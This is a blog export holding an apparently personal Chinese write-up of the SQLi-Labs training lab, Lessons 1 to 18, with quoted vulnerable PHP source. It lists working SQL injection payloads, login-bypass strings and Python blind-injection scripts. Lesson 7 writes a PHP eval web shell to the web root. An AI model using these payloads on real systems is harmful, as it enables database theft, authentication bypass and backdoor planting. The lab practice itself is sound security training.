{"meta":{"title":"R4x's Blog","subtitle":"R4x's Blog","description":"道阻且长，行则将至","author":"R4x","url":"http://example.com","root":"/"},"pages":[{"title":"Index.me","date":"2022-11-10T08:09:46.000Z","updated":"2022-11-10T08:44:15.822Z","comments":true,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":"Test"},{"title":"[404]","date":"2022-11-10T08:35:36.975Z","updated":"2022-11-10T08:35:36.975Z","comments":true,"path":"404.html","permalink":"http://example.com/404.html","excerpt":"","text":""}],"posts":[{"title":"SQLi-Labs靶场刷题记录【Basic Challenges】","slug":"SQLi-Labs Basic Challenges","date":"2022-11-10T15:47:05.141Z","updated":"2022-11-10T15:52:26.803Z","comments":true,"path":"2022/11/10/SQLi-Labs Basic Challenges/","link":"","permalink":"http://example.com/2022/11/10/SQLi-Labs%20Basic%20Challenges/","excerpt":"","text":"Lesson 1GET - Error based - Single quotes - String(基于错误的GET单引号字符型注入提示用参数名为id，值为数字，尝试一下： 1http://127.0.0.1/Less-1/?id=1 显示了用户名和密码，测试后发现共有14条数据。 【1】查列数1http://127.0.0.1/Less-1/?id=1&#x27; order by 3 --+ 1http://127.0.0.1/Less-1/?id=1&#x27; order by 4 --+ 到第四列时报错，共有三列数据 【2】查库名1http://127.0.0.1/Less-1/?id=?id=-1&#x27; union select 3,database(),database(); --+ 要注意的两个点： id必须为-1，或任何表中不存在的id，因为如果存在的话，name和password处就会显示该表中该id对应的数据，后面联合查询到的数据不会被显示出来 联合查询会将查出来的数据与原来查询出的数据并列，所以联合查询的条数要等于原表中的列数，否则会报错，这里查询出来大约是如下的样子：123456+----+--------------+---------------------------+| id | name | url | +----+--------------+---------------------------+| -1 | | || 3 | security | security |+----+--------------+---------------------------+ 【3】获取所有表1http://127.0.0.1/Less-1/?id=?id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+ GROUP_CONCAT()：将group by产生的同一个分组中的值连接起来，返回一个字符串结果 information_schema.tables各字段说明： 字段 含义 Table_catalog 数据表登记目录 Table_schema 数据表所属的数据库名 Table_name 表名称 Table_type 表类型[system view|base table] Engine 使用的数据库引擎[MyISAM|CSV|InnoDB] Version 版本，默认值10 Row_format 行格式[Compact|Dynamic|Fixed] Table_rows 表里所存多少行数据 Avg_row_length 平均行长度 Data_length 数据长度 Max_data_length 最大数据长度 Index_length 索引长度 Data_free 空间碎片 Auto_increment 做自增主键的自动增量当前值 Create_time 表的创建时间 Update_time 表的更新时间 Check_time 表的检查时间 Table_collation 表的字符校验编码集 Checksum 校验和 Create_options 创建选项 Table_comment 表的注释、备注 【4】查询字段1http://127.0.0.1/Less-1/?id=?id=-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+ 字段 含义 table_schema&nbsp; 表所有者（对于schema的名称） table_name&nbsp; 表名 column_name&nbsp; 列名 ordinal_position&nbsp; 列标识号 column_default&nbsp; 列的默认值 is_nullable&nbsp; 列的为空性。如果列允许 null，那么该列返回 yes。否则，返回 no data_type&nbsp; 系统提供的数据类型 character_maximum_length 以字符为单位的最大长度，适于二进制数据、字符数据，或者文本和图像数据。否则，返回 null。有关更多信息，请参见数据类型 character_octet_length&nbsp; 以字节为单位的最大长度，适于二进制数据、字符数据，或者文本和图像数据。否则，返回 nu numeric_precision&nbsp; 近似数字数据、精确数字数据、整型数据或货币数据的精度。否则，返回 null numeric_precision_radix&nbsp; 近似数字数据、精确数字数据、整型数据或货币数据的精度基数。否则，返回 null numeric_scale&nbsp; 近似数字数据、精确数字数据、整数数据或货币数据的小数位数。否则，返回 null datetime_precision&nbsp; datetime 及 sql-92 interval 数据类型的子类型代码。对于其它数据类型，返回 null character_set_catalog&nbsp; 如果列是字符数据或 text 数据类型，那么返回 master，指明字符集所在的数据库。否则，返回 null character_set_schema&nbsp; 如果列是字符数据或 text 数据类型，那么返回 dbo，指明字符集的所有者名称。否则，返回 null character_set_name&nbsp; 如果该列是字符数据或 text 数据类型，那么为字符集返回唯一的名称。否则，返回 null collation_catalog&nbsp; 如果列是字符数据或 text 数据类型，那么返回 master，指明在其中定义排序次序的数据库。否则此列为 null collation_schema&nbsp; 返回 dbo，为字符数据或 text 数据类型指明排序次序的所有者。否则，返回 null collation_name&nbsp; 如果列是字符数据或 text 数据类型，那么为排序次序返回唯一的名称。否则，返回 null。 domain_catalog&nbsp; 如果列是一种用户定义数据类型，那么该列是某个数据库名称，在该数据库名中创建了这种用户定义数据类型。否则，返回 null domain_schema&nbsp; 如果列是一种用户定义数据类型，那么该列是这种用户定义数据类型的创建者。否则，返回 null domain_name&nbsp; 如果列是一种用户定义数据类型，那么该列是这种用户定义数据类型的名称。否则，返回 NULL 【5】查询用户名和密码1http://127.0.0.1/Less-1/?id=?id=-1&#x27; union select 1,2,group_concat(username) from security.users --+ 1http://127.0.0.1/Less-1/?id=?id=-1&#x27; union select 1,2,group_concat(password) from security.users --+ Lesson 2GET - Error based - Intiger based (基于错误的GET整型注入) 【1】查列数1http://127.0.0.1/Less-2/?id=1 and 1=1 --+ 1http://127.0.0.1/Less-2/?id=1 and 1=1 order by 3 --+ 列数为4 【2】查库名1http://127.0.0.1/Less-2/?id=-1 union select 1,2,database(); --+ 【3】获取所有表1http://127.0.0.1/Less-2/?id=1 and 1=2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; --+ 【4】查询字段1http://127.0.0.1/Less-2/?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+ 【5】查询用户名和密码1http://127.0.0.1/Less-2/?id=-1 union select 1,2,group_concat(username) from security.users --+ 1http://127.0.0.1/Less-2/?id=-1 union select 1,2,group_concat(password) from security.users --+ Lesson 3GET - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入)尝试用单引号： 1http://127.0.0.1/Less-3/?id=-1 &#x27; union select 1,2,3 --+ 报错了，发现是因为括号没有闭合，那就闭合一下再试一试： 1http://127.0.0.1/Less-3/?id=-1&#x27; ) union select 1,2,3 --+ 注入正常，列数与前面相同，直接查库名： 1http://127.0.0.1/Less-3/?id=-1&#x27; ) union select 1,database(),3 --+ 查表名： 1http://127.0.0.1/Less-3/?id=-1&#x27; ) union select 1,3,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; --+ 查字段： 1http://127.0.0.1/Less-3/?id=-1&#x27; ) union select 1,3,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; --+ 查数据： 12//usernamehttp://127.0.0.1/Less-3/?id=-1&#x27; ) union select 1,3,group_concat(username) from security.users --+ 12//passwordhttp://127.0.0.1/Less-3/?id=-1&#x27; ) union select 1,3,group_concat(password) from security.users --+ 源码123$sql=&quot;SELECT * FROM users WHERE id=(&#x27;$id&#x27;) LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result); 可以看到这里的$id是单引号和括号同时包裹起来的，所以payload中不仅要闭合单引号，还要闭合一个左括号，其他的和之前的题目一样 Lesson 4Error based - Double Quotes - String （基于错误的GET双引号字符型注入）看标题是基于双引号的，尝试一下： 1http://127.0.0.1/Less-4/?id=-1&quot; union select 1,2,3 --+ 发现还有个括号，加个括号： 1http://127.0.0.1/Less-4/?id=-1&quot;) union select 1,2,3 --+ 剩下的就和前面的一样了，不再赘述 源码1234$id = &#x27;&quot;&#x27; . $id . &#x27;&quot;&#x27;;$sql=&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result); Lesson 5GET - Double Injection - Single Quotes - String (双注入GET单引号字符型注入)正常输入看一下回显： 1http://127.0.0.1/Less-5/?id=1 与前几题不通，开始不显示具体信息了，可以判断是盲注，只能通过返回的状态来判断payload中注入的语句是否正确，尝试查一下列数： 1http://127.0.0.1/Less-5/?id=1&#x27; order by 4 --+ 有报错，列数为3，接下来查库名，因为是盲注，所以不能指望会显示出返回的信息，只能根据bool型的注入语句看有无回显来猜测库名。首先猜测库名的长度，构造下面的语句： 1http://127.0.0.1/Less-5/?id=1&#x27; and length(database())=1--+ 一直枚举到8出现回显，说明库名长度为8 1http://127.0.0.1/Less-5/?id=1&#x27; and substring(database(),1,1)=&#x27;a&#x27;--+ 发现没有显示信息，再尝试以下payload：尝试暴库名： 1http://127.0.0.1/Less-5/?id=1&#x27; and substring(database(),1,1)=&#x27;s&#x27;--+ 显示了，说明库名的第一个字符为s直接写脚本暴库名： 123456789101112131415161718192021222324252627282930import requestsURL = &quot;http://127.0.0.1/Less-5/&quot;# 获取数据库名长度def db_len(): for i in range(1,10): payload = &quot;?id=1&#x27; and length(database())=&#123;0&#125;--+&quot;.format(i) r = requests.get(URL + payload) if(r.headers[&#x27;Content-Length&#x27;])!=&#x27;436&#x27;: return int(i)# 获取数据库名def db_name(length): name = &quot;&quot; for i in range(1,length+1): for j in range(0,26): char = chr(97+j) payload = &quot;?id=1&#x27; and substring(database(),&#123;0&#125;,1)=&#x27;&#123;1&#125;&#x27;--+&quot;.format(i,char) r = requests.get(URL + payload) if(r.headers[&#x27;Content-Length&#x27;])!=&#x27;436&#x27;: name += char continue return namedef main(): print(db_name(db_len()))main() 执行结果如下：表名 1http://127.0.0.1/Less-5/?id=1&#x27; and if((substring((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),1,1)=&#x27;e&#x27;),1,0) --+ 列名： 1http://127.0.0.1/Less-5/?id=1&#x27; and if((substring((select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),1,1)=&#x27;i&#x27;),1,0) --+ 用户名： 1http://127.0.0.1/Less-5/?id=1&#x27; and if((substring((select group_concat(username) from security.users),1,1)=&#x27;D&#x27;),1,0) --+ 密码： 1http://127.0.0.1/Less-5/?id=1&#x27; and if((substring((select group_concat(password) from security.users),1,1)=&#x27;D&#x27;),1,0) --+ 表名和列名和数据使用以上对应的payload简单修改程序就可以爆破出来 xmlupdate报错注入思路暴库名： 1http://127.0.0.1/Less-5/?id=1&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) --+ 暴内容： 1http://127.0.0.1/Less-5/?id=1&#x27; and updatexml(1,concat(0x7e,(substr((select group_concat(username,0x5e,password) from users),1)),0x7e),1) --+ 这里并没有显示完整，问题是报错信息一次只能显示31个字符，将substr里的启示位置每次增加31，就可以将完整的数据暴出来 12345678910111213141516171819import requestsfrom lxml import etreeURL = &quot;http://127.0.0.1/Less-5/&quot;def main(): for i in range (0,100): payload = &quot;?id=1&#x27; and updatexml(1,concat(0x7e,(substr((select\\ group_concat(username,0x5e,password) from users),&#123;0&#125;)),\\ 0x7e),1) --+&quot;.format(1+i*31) r = requests.get(URL+payload) if r.headers[&#x27;Content-Length&#x27;]==&#x27;459&#x27;:break html = etree.HTML(r.text) result = html.xpath(&#x27;/html/body/div/font[2]/font[1]/text()&#x27;) print(result)main() 结果如下： 源码12345678910111213141516171819&lt;?php//including the Mysql connect parameters.include(&quot;../sql-connections/sql-connect.php&quot;);error_reporting(0);// take the variablesif(isset($_GET[&#x27;id&#x27;]))&#123;$id=$_GET[&#x27;id&#x27;];//logging the connection parameters to a file for analysis.$fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;);fwrite($fp,&#x27;ID:&#x27;.$id.&quot;\\n&quot;);fclose($fp);// connectivity $sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result); Lesson 6Double Injection - Double Quotes - String (双注入GET双引号字符型注入)除了单引号变为双引号，与第五关没有区别，改一下Lesson5的程序就可以利用了 源码：12345678910111213141516171819&lt;?php//including the Mysql connect parameters.include(&quot;../sql-connections/sql-connect.php&quot;);error_reporting(0);// take the variablesif(isset($_GET[&#x27;id&#x27;]))&#123;$id=$_GET[&#x27;id&#x27;];//logging the connection parameters to a file for analysis.$fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;);fwrite($fp,&#x27;ID:&#x27;.$id.&quot;\\n&quot;);fclose($fp);// connectivity $id = &#x27;&quot;&#x27;.$id.&#x27;&quot;&#x27;;$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result); Lesson 7Dump into outfile - String （导出文件GET字符型注入）id=1先看一下：提示用outfile，outfile是mysql中导出数据到文本文件中的语句，如： 1SELECT * FROM passwd INTO OUTFILE &#x27;/password.txt&#x27; 这样会在当前目录下创建一个文件，这里要注意，在SQL注入中利用Outfile，这里的路径只能是网站的绝对路径回到题目，测试后发现能够闭合的payload如下： 1http://127.0.0.1/Less-7/?id=1&#x27; )) --+ 尝试写入一句话木马： 1http://127.0.0.1/Less-7/?id=1&#x27; )) union select 1,2,&#x27;&lt;?php @eval($_POST[&quot;pass&quot;]);?&gt;&#x27; into outfile &#x27;/var/www/html/bk.php&#x27; --+ 需要注意的是，由于我的环境是docker，刚开始使用上面的payload写入文件时发现写不进去，查阅资料后发现是缺少权限，就手动给网站目录加了可写权限虽然还是这个界面但是在网站目录下已经看到了写入的木马文件蚁剑连接： Lesson 8GET - Blind - Boolian Based - Single Quotes (布尔型单引号GET盲注)布尔型的单引号盲注，爆表方法与Lesson5一样，程序改一下可以直接使用 1234567891011121314151617181920212223242526272829303132333435from turtle import htimport requestsfrom lxml import etreeURL = &quot;http://127.0.0.1/Less-8/&quot;# 获取数据库名长度def db_len(): for i in range(1,10): payload = &quot;?id=1&#x27; and length(database())=&#123;0&#125;--+&quot;.format(i) r = requests.get(URL + payload) # 这里改了判断内容长度 if(r.headers[&#x27;Content-Length&#x27;])!=&#x27;442&#x27;: return int(i)# 获取数据库名def db_name(length): name = &quot;&quot; for i in range(1,length+1): for j in range(0,26): char = chr(97+j) payload = &quot;?id=1&#x27; and substring(database(),&#123;0&#125;,1)\\ =&#x27;&#123;1&#125;&#x27;--+&quot;.format(i,char) r = requests.get(URL + payload) # 这里也改了 if(r.headers[&#x27;Content-Length&#x27;])!=&#x27;442&#x27;: name += char continue return namedef main(): print(db_name(db_len()))main() 其余的也与Lesson-5相同，不再赘述但由于错误不会返回任何信息，Lesson5中用到的xmlupdate()的思路也不能用 Lesson 9GET - Blind - Time based. - Single Quotes (基于时间的GET单引号盲注)这里无论输入是否合法都只会显示下面的页面：但是并没有ban掉sleep函数，结合题目，是基于时间的盲注，构造如下的payload： 1http://127.0.0.1/Less-9/?id=1&#x27; and if(length(database())=8,sleep(5),1) --+ 当语句正确时延迟五秒：可以看到网页加载的时间，与语句不正确时有明显的的区别： 1http://127.0.0.1/Less-9/?id=1&#x27; and if(length(database())=1,sleep(5),1) --+ 我们可以基于此来猜测库名表名数据等等库名： 1http://127.0.0.1/Less-9/?id=1&#x27; and if(substr(database(),1,1)=&#x27;s&#x27;,sleep(5),1) --+ 表名： 12345//第一个表名http://127.0.0.1/Less-9/?id=1&#x27; and if(substr((select table_name from information_schema.tables where table_schema = &#x27;security&#x27; limit 0，1),1,1)=&#x27;e&#x27;,sleep(5),1) --+//第二个表名http://127.0.0.1/Less-9/?id=1&#x27; and if(substr((select table_name from information_schema.tables where table_schema = &#x27;security&#x27; limit 0，1),1,1)=&#x27;r&#x27;,sleep(5),1) --+ 列名： 12345//第一个列名http://127.0.0.1/Less-9/?id=1&#x27; and if(substr((select column_name from information_schema.columns where table_name = &#x27;users&#x27; limit 0,1),1,1)=&#x27;i&#x27;,sleep(5),1) --+//第二个列名http://127.0.0.1/Less-9/?id=1&#x27; and if(substr((select column_name from information_schema.columns where table_name = &#x27;users&#x27; limit 1,1),1,1)=&#x27;u&#x27;,sleep(5),1) --+ 数据： 12345//usernamehttp://127.0.0.1/Less-9/?id=1&#x27; and if(substr((select username from users limit 0,1),1,1)=&#x27;D&#x27;,sleep(5),1) --+//passwordhttp://127.0.0.1/Less-9/?id=1&#x27; and if(substr((select password from users limit 0,1),1,1)=&#x27;D&#x27;,sleep(5),1) --+ Lesson 10GET - Blind - Time based - double quotes (基于时间的双引号盲注)与Lesson9的唯一区别是闭合方式从单引号改为双引号，其余都一样，稍微修改一下payload就好 Lesson 11POST - Error Based - Single quotes- String (基于错误的POST型单引号字符型注入)打开题目，映入眼帘的是一个提交框是一道基于POST方法的题目，结合题目，单引号报错型，ok，那第一步要先抓个包看一下提交的参数名是什么，如下：接着在浏览器hackbar插件里面用POST方法提交就好了：构造payload： 1uname=admin&#x27; and 1=1 --+&amp;passwd=whatever 这里是POST提交的数据，先用单引号将uname=admin闭合，然后和一个恒真语句相与，并将后面的passwd字段注释掉，这样服务器收到的并执行的语句就是这样： 1@$sql=&quot;SELECT username, password FROM users WHERE username=&#x27;admin&#x27; and 1=1 --+&#x27; and password=&#x27;$passwd&#x27; LIMIT 0,1&quot;; 直接登录成功：这也是一些后台万能密码的原理，其他的一些万能密码如下： admin&#39; -- admin&#39; # admin&#39;/* &#39; or 1=1-- &#39; or 1=1# &#39; or 1=1/* &#39;) or &#39;1&#39;=&#39;1-- &#39;) or (&#39;1&#39;=&#39;1--登录进来后，查一下列数：1uname=admin&#x27; order by 3 --+&amp;passwd=whatever 到3时报错暴库，这里找了个不存在的账号，否则不会显示union select出的内容：1uname=1&#x27; union select 1,database() --+&amp;passwd=whatever 爆表：1uname=1&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema = &#x27;security&#x27; --+&amp;passwd=whatever 爆字段：1uname=1&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name= &#x27;users&#x27; --+&amp;passwd=whatever 爆用户名：1uname=1&#x27; union select 1,username from security.users limit 0,1 --+&amp;passwd=whatever 递增limit 0,1第一个参数的值枚举数据同理爆密码：1uname=1&#x27; union select 1,password from security.users limit 2,1 --+&amp;passwd=whatever 源码1234567891011121314151617if(isset($_POST[&#x27;uname&#x27;]) &amp;&amp; isset($_POST[&#x27;passwd&#x27;]))&#123; $uname=$_POST[&#x27;uname&#x27;]; $passwd=$_POST[&#x27;passwd&#x27;]; //logging the connection parameters to a file for analysis. $fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;); fwrite($fp,&#x27;User Name:&#x27;.$uname); fwrite($fp,&#x27;Password:&#x27;.$passwd.&quot;\\n&quot;); fclose($fp); // connectivity @$sql=&quot;SELECT username, password FROM users WHERE username=&#x27;$uname&#x27;\\ and password=&#x27;$passwd&#x27; LIMIT 0,1&quot;; $result=mysql_query($sql); $row = mysql_fetch_array($result); Lesson 12POST - Error Based - Double quotes- String-with twist (基于错误的双引号POST型字符型变形的注入)加个双引号先尝试一下： 1uname=admin&quot; &amp;passwd=whatever 报错，发现还要闭合一个括号：加个括号： 1uname=admin&quot;) --+ &amp;passwd=whatever 登录成功，其余同Lesson11，不再赘述 源码1234567// connectivity$uname=&#x27;&quot;&#x27;.$uname.&#x27;&quot;&#x27;;$passwd=&#x27;&quot;&#x27;.$passwd.&#x27;&quot;&#x27;; @$sql=&quot;SELECT username, password FROM users WHERE username=\\(&quot;$uname&quot;) and password=($passwd) LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result); Lesson 13POST - Double Injection - Single quotes- String -twist (POST单引号变形双注入)尝试一下单引号： 1uname=admin&#x27; &amp;passwd=whatever 报错：发现还需要闭合一个单引号： 1uname=admin&#x27;) --+&amp;passwd=whatever 显示登录成功，但没有显示具体的信息，推测是盲注，测试一下 1uname=admin&#x27;) and if(length(database())=1,1,0)--+&amp;passwd=whatever 1uname=admin&#x27;) and if(length(database())=8,1,0)--+&amp;passwd=whatever 嗯，果然是，但是此处受Lesson5的启发，尝试一下基于xmlupdate()的报错注入： 1uname=admin&#x27;) and updatexml(1,concat(0x7e,database(),0x7e),1)--+&amp;passwd=whatever 成功：剩下的就和Lesson 5一样了，不再赘述 源码//注意源码注释了显示用户名和密码信息的代码 12345678910111213141516171819202122232425@$sql=&quot;SELECT username, password FROM users WHERE username=(&#x27;$uname&#x27;)\\ and password=(&#x27;$passwd&#x27;) LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);if($row)&#123; //echo &#x27;&lt;font color= &quot;#0000ff&quot;&gt;&#x27;; echo &quot;&lt;br&gt;&quot;; echo &#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#x27;; //echo &quot; You Have successfully logged in &quot; ; echo &#x27;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&#x27;; echo &quot;&lt;br&gt;&quot;; //echo &#x27;Your Login name:&#x27;. $row[&#x27;username&#x27;]; //echo &quot;&lt;br&gt;&quot;; //echo &#x27;Your Password:&#x27; .$row[&#x27;password&#x27;]; //echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &#x27;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&#x27;; echo &quot;&lt;/font&gt;&quot;; &#125; Lesson 14POST - Double Injection - Single quotes- String -twist (POST单引号变形双注入)尝试了一下单引号发现没用，双引号闭合登录成功： 1uname=admin&quot; --+&amp;passwd=whatever 但是没有显示信息，只能用盲注： 1uname=admin&quot; and if(length(database())=1,1,0) --+&amp;passwd=whatever 其余与Lesson 13一样，再试一下xmlupdate报错注入： 1uname=admin&quot; and updatexml(1,concat(0x7e,database(),0x7e),1)--+&amp;passwd=whatever 成功，其余与Lesson13同 源码123456$uname=&#x27;&quot;&#x27;.$uname.&#x27;&quot;&#x27;;$passwd=&#x27;&quot;&#x27;.$passwd.&#x27;&quot;&#x27;; @$sql=&quot;SELECT username, password FROM users WHERE username=\\$uname and password=$passwd LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result); Lesson 15POST - Blind- Boolian/time Based - Single quotes (基于bool型/时间延迟单引号POST型盲注)加单引号尝试一下： 1uname=admin&#x27; --+&amp;passwd=whatever 登录成功：尝试报错注入后，发现没有任何回显，直接bool盲注，根据是否登录成功来判断条件是否正确： 1uname=admin&#x27; and if(length(database())=1,1,0) --+&amp;passwd=whatever 1uname=admin&#x27; and if(length(database())=8,1,0) --+&amp;passwd=whatever 基于此修改Lesson 5的枚举脚本就即可得到数据 源码1234567891011121314151617181920212223242526@$sql=&quot;SELECT username, password FROM users WHERE username\\=&#x27;$uname&#x27; and password=&#x27;$passwd&#x27; LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);if($row)&#123; //echo &#x27;&lt;font color= &quot;#0000ff&quot;&gt;&#x27;; echo &quot;&lt;br&gt;&quot;; echo &#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#x27;; //echo &quot; You Have successfully logged in\\n\\n &quot; ; echo &#x27;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&#x27;; echo &quot;&lt;br&gt;&quot;; //echo &#x27;Your Login name:&#x27;. $row[&#x27;username&#x27;]; echo &quot;&lt;br&gt;&quot;; //echo &#x27;Your Password:&#x27; .$row[&#x27;password&#x27;]; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &#x27;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&#x27;; echo &quot;&lt;/font&gt;&quot;; &#125; Lesson 16POST - Blind- Boolian/Time Based - Double quotes (基于bool型/时间延迟的双引号POST型盲注)除了闭合方式从&#39;闭合变为&quot;)闭合外，与Lesson15一样 1uname=admin&quot;) and if(length(database())=8,1,0) --+&amp;passwd=whatever 源码123456$uname=&#x27;&quot;&#x27;.$uname.&#x27;&quot;&#x27;;$passwd=&#x27;&quot;&#x27;.$passwd.&#x27;&quot;&#x27;; @$sql=&quot;SELECT username, password FROM users WHERE username\\=($uname) and password=($passwd) LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result); Lesson 17POST - Update Query- Error Based - String (基于错误的更新查询POST注入)打开题目，发现是密码重置的界面尝试重置一下admin的密码： 1uname=admin&amp;passwd=123 成功重置了admin的密码看一下源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657function check_input($value) &#123; if(!empty($value)) &#123; // truncation (see comments) $value = substr($value,0,15); &#125; // Stripslashes if magic quotes enabled if (get_magic_quotes_gpc()) &#123; $value = stripslashes($value); &#125; // Quote if not a number if (!ctype_digit($value)) &#123; $value = &quot;&#x27;&quot; . mysql_real_escape_string($value) . &quot;&#x27;&quot;; &#125; else &#123; $value = intval($value); &#125; return $value; &#125;// take the variablesif(isset($_POST[&#x27;uname&#x27;]) &amp;&amp; isset($_POST[&#x27;passwd&#x27;]))&#123;//making sure uname is not injectable$uname=check_input($_POST[&#x27;uname&#x27;]); $passwd=$_POST[&#x27;passwd&#x27;];//logging the connection parameters to a file for analysis.$fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;);fwrite($fp,&#x27;User Name:&#x27;.$uname.&quot;\\n&quot;);fwrite($fp,&#x27;New Password:&#x27;.$passwd.&quot;\\n&quot;);fclose($fp);// connectivity @$sql=&quot;SELECT username, password FROM users WHERE username= $uname LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result); if($row) &#123; //echo &#x27;&lt;font color= &quot;#0000ff&quot;&gt;&#x27;; $row1 = $row[&#x27;username&#x27;]; //echo &#x27;Your Login name:&#x27;. $row1; $update=&quot;UPDATE users SET password = &#x27;$passwd&#x27; WHERE username=&#x27;$row1&#x27;&quot;; mysql_query($update); echo &quot;&lt;br&gt;&quot;; 发现使用check_input函数对uname做了过滤：首先做了截断，将字符限制在15个以内，然后先判断phpmagic_quotes_gpc环境变量是否打开，取出转义的\\，最后，如果uname不是数字，则将其字符进行转义，是数字将其转为数字类型。 mysql_real_escape_string()函数：get_magic_quotes_gpc()函数取得PHP环境配置的变量magic_quotes_gpc(GPC, Get/Post/Cookie)值。返回0表示本功能关闭，返回1表示本功能打开。当magic_quotes_gpc打开时，所有的&#39;(单引号)、&quot;(双引号)、\\(反斜杠)和NULL(空字符)会自动转为含有反斜杠的溢出字符。（参考：https://www.jianshu.com/p/62d394c38230 ） addslashes()与stripslashes()函数：addslashes(string)函数返回在预定义字符之前添加反斜杠\\的字符串，stripslashes(string)函数删除由addslashes()函数添加的反斜杠。可见，想用uname进行注入十分困难，但passwd参数就比较容易，因为在源码的倒数第三行passwd参数被用来更新密码，这里的passwd没有经过任何过滤，构造payload：1uname=admin&amp;passwd=&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1)--+ 这里用的还是基于xmlupdate()函数的报错注入，可以看到直接返回了数据库名：其余的部分与Lesson 5类似，不再赘述Lesson 18 POST - Header Injection - Uagent field - Error based (基于错误的用户代理，头部POST注入)随便输入看下回显，发现直接显示了我的ip地址和User-Agent头信息：再结合题目标题，应该是HTTP头注入，这里直接获取了我请求包中的信息显示了出来，看下源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103&lt;?php//including the Mysql connect parameters.include(&quot;../sql-connections/sql-connect.php&quot;);error_reporting(0); function check_input($value) &#123; if(!empty($value)) &#123; // truncation (see comments) $value = substr($value,0,20); &#125; // Stripslashes if magic quotes enabled if (get_magic_quotes_gpc()) &#123; $value = stripslashes($value); &#125; // Quote if not a number if (!ctype_digit($value)) &#123; $value = &quot;&#x27;&quot; . mysql_real_escape_string($value) . &quot;&#x27;&quot;; &#125; else &#123; $value = intval($value); &#125; return $value; &#125; $uagent = $_SERVER[&#x27;HTTP_USER_AGENT&#x27;]; $IP = $_SERVER[&#x27;REMOTE_ADDR&#x27;]; echo &quot;&lt;br&gt;&quot;; echo &#x27;Your IP ADDRESS is: &#x27; .$IP; echo &quot;&lt;br&gt;&quot;; //echo &#x27;Your User Agent is: &#x27; .$uagent;// take the variablesif(isset($_POST[&#x27;uname&#x27;]) &amp;&amp; isset($_POST[&#x27;passwd&#x27;])) &#123; $uname = check_input($_POST[&#x27;uname&#x27;]); $passwd = check_input($_POST[&#x27;passwd&#x27;]); /* echo &#x27;Your Your User name:&#x27;. $uname; echo &quot;&lt;br&gt;&quot;; echo &#x27;Your Password:&#x27;. $passwd; echo &quot;&lt;br&gt;&quot;; echo &#x27;Your User Agent String:&#x27;. $uagent; echo &quot;&lt;br&gt;&quot;; echo &#x27;Your User Agent String:&#x27;. $IP; */ //logging the connection parameters to a file for analysis. $fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;); fwrite($fp,&#x27;User Agent:&#x27;.$uname.&quot;\\n&quot;); fclose($fp); $sql=&quot;SELECT users.username, users.password FROM users WHERE\\ users.username=$uname and users.password=$passwd ORDER BY \\ users.id DESC LIMIT 0,1&quot;; $result1 = mysql_query($sql); $row1 = mysql_fetch_array($result1); if($row1) &#123; echo &#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;; $insert=&quot;INSERT INTO `security`.`uagents` (`uagent`,\\ `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;; mysql_query($insert); //echo &#x27;Your IP ADDRESS is: &#x27; .$IP; echo &quot;&lt;/font&gt;&quot;; //echo &quot;&lt;br&gt;&quot;; echo &#x27;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#x27;; echo &#x27;Your User Agent is: &#x27; .$uagent; echo &quot;&lt;/font&gt;&quot;; echo &quot;&lt;br&gt;&quot;; print_r(mysql_error()); echo &quot;&lt;br&gt;&lt;br&gt;&quot;; echo &#x27;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&#x27;; echo &quot;&lt;br&gt;&quot;; &#125; else &#123; echo &#x27;&lt;font color= &quot;#0000ff&quot; font 